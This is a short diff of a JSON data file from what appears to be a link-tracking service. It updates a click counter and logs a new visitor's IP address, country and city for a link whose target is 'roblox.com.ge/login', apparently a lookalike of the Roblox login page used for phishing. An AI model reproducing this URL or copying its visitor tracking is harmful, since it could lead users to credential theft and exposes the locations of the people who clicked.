@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1105,
+    "useCount": 1106,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8984,6 +8984,14 @@
         "city": "Hanoi",
         "flag": "🇻🇳",
         "countryCode": "VN"
+      },
+      {
+        "timestamp": 1777262977428,
+        "ip": "103.10.22.186",
+        "country": "Mongolia",
+        "city": "Ulan Bator",
+        "flag": "🇲🇳",
+        "countryCode": "MN"
       }
     ]
   },
